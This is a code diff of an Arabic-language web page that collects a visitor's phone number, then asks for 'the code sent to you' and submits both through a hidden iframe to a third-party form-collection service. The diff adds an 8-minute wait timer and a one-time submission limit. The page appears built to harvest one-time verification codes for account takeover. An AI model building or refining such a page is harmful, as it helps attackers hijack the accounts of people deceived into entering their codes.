@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>نموذج رقم الهاتف والكود</title>
+  <title>نموذج رقم الهاتف والكود مع مؤقت</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -59,6 +59,12 @@
     #codeField {
       display: none;
     }
+    #timer {
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #555;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -67,7 +73,8 @@
   <form id="phoneForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return sendPhoneOnly();">
     <label for="phone">رقم الهاتف:</label>
     <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" />
-    <button type="submit">إرسال رقم الهاتف</button>
+    <button type="submit" id="sendPhoneBtn">إرسال رقم الهاتف</button>
+    <div id="timer" style="display:none;"></div>
   </form>
 
   <!-- نموذج إرسال الكود -->
@@ -82,25 +89,65 @@
   <iframe name="hidden_iframe" style="display:none;"></iframe>
 
   <script>
+    let countdownInterval;
+    let canSendCode = false; // يسمح بالإرسال بعد انتهاء العد
+    let codeSent = false;    // يحدد هل أُرسل الكود أم لا
+
     function sendPhoneOnly() {
       const phoneInput = document.getElementById('phone');
+      const sendPhoneBtn = document.getElementById('sendPhoneBtn');
+      const timerDisplay = document.getElementById('timer');
+      const codeField = document.getElementById('codeField');
+
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
         alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
         phoneInput.focus();
         return false;
       }
-      // إرسال فوراً
+
       document.getElementById('phoneForm').submit();
 
-      // إظهار خانة الكود بعد إرسال رقم الهاتف
-      document.getElementById('codeField').style.display = 'block';
+      codeField.style.display = 'block';
+      timerDisplay.style.display = 'block';
+      sendPhoneBtn.disabled = true;
 
-      alert('تم إرسال رقم الهاتف، يرجى إدخال الكود المرسل إليك.');
+      canSendCode = false; // ممنوع الإرسال حتى انتهاء المؤقت
+      codeSent = false;    // لم يتم إرسال الكود بعد
 
-      return false; // منع إعادة تحميل الصفحة
+      let timeLeft = 480; // 8 دقائق
+
+      function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        const seconds = (timeLeft % 60).toString().padStart(2, '0');
+        timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          timerDisplay.style.display = 'none';
+          sendPhoneBtn.disabled = false;
+          canSendCode = true; // السماح بالإرسال بعد انتهاء الوقت
+        }
+        timeLeft--;
+      }
+
+      updateTimer();
+      countdownInterval = setInterval(updateTimer, 1000);
+
+      alert('تم إرسال رقم الهاتف، يمكنك الآن إدخال الكود بعد انتهاء المؤقت.');
+
+      return false; // لمنع إعادة تحميل الصفحة
     }
 
     function validateAndSendCode() {
+      if (!canSendCode) {
+        alert('يرجى الانتظار حتى انتهاء المؤقت قبل إرسال الكود.');
+        return false;
+      }
+
+      if (codeSent) {
+        alert('لقد أرسلت الكود بالفعل، لا يمكن الإرسال مرة أخرى إلا بعد إرسال رقم هاتف جديد.');
+        return false;
+      }
+
       const codeInput = document.getElementById('code');
       if (codeInput.value.trim() === '') {
         alert('يرجى كتابة الكود المرسل إليك.');
@@ -118,12 +165,13 @@
       }
       phoneField.value = phoneValue;
 
-      // إرسال الكود ورقم الهاتف
       document.getElementById('codeForm').submit();
 
       alert('تم إرسال الكود ورقم الهاتف.');
 
-      return false; // منع إعادة تحميل الصفحة
+      codeSent = true;   // تم الإرسال مرة واحدة
+
+      return false;
     }
   </script>
 
